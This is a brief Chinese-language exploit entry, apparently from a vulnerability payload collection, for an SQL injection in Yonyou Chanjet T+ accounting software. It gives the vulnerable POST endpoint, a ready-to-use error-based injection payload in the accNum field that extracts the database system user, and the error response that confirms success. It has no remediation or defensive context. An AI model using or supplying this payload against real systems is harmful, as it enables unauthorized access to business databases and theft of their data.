# 用友畅捷通T+SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1`

**Payload**
```
{"accNum": "3' AND 3417 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(107)+CAR(107)+CHAR(113)+(SELECT SUBSTRING((ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))),1,1024))+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(113)+CHAR(113)))-- QoLY", "functionTag": "SYS0104", "url": ""}
```
- **响应特征**：200 数据库错误